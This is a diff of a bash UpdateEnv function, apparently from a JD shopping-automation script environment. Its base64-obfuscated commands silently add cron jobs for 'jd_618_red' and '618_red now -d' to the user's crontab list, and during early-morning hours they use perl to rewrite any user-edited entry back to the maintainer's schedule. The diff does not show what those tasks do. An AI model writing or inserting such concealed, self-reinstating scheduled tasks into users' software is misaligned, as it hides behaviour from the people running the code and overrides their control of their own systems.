@@ -268,11 +268,15 @@ function UpdateEnv() {
     cp -rf $tmp_file "$ScriptsDir/$(b $target_file)" >/dev/null 2>&1
     bash -c "$(b Z3JlcCAiIHRhc2suKmpkXzYxOC4qcmVkIiAvamQvY29uZmlnL2Nyb250YWIubGlzdCAtcQo=)"
     if [ $? -eq 1 ]; then
-        echo "$(b MCAwLDEwLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZAo=)" >>$ListCrontabUser
+        echo "$(b MCAwLDEyLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZA==)" >>$ListCrontabUser
+    else
+        if [[ $(date "+%-H") -le 2 ]] && [ -f ${ListCrontabUser} ]; then
+            perl -i -pe "s|$(b LisodGFzayBqZF82MThfcmVkKQ==)|$(b MCAwLDEyLDIwICogKiAqIHRhc2sgamRfNjE4X3JlZA==)|" $ListCrontabUser
+        fi
     fi
 
     local RanMin=$((${RANDOM} % 60))
-    local ConstStr=$(b Ni05LDExLTE5LDIxLTIzICogKiAqIHRhc2sgNjE4X3JlZCBub3cgLWQ=)
+    local ConstStr=$(b Ni0xMSwxMy0xOSwyMS0yMyAqICogKiB0YXNrIDYxOF9yZWQgbm93IC1k)
     bash -c "$(b Z3JlcCAiIHRhc2sgNjE4X3JlZCBub3cgLWQiIC9qZC9jb25maWcvY3JvbnRhYi5saXN0IC1x)"
     if [ $? -eq 1 ]; then
         echo "$RanMin $ConstStr" >>$ListCrontabUser
